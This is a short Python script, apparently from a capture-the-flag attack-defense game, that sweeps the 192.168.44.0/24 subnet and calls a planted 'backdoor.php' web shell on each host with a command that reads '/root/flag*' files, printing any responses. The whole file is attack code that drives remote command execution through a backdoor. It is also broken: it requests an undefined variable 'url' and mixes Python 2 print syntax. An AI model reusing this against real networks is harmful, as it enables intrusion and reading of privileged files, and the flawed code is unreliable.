import requests
for i in range(254):
	try:
		ip='http://192.168.44.'+str(i)
		url1=str(ip)+'/backdoor.php?cmd=cat /root/flag*'
		re=requests.get(url,timeout=0.1)
		if re.status_code==200:
			print ip,re.text
	except:
		pass
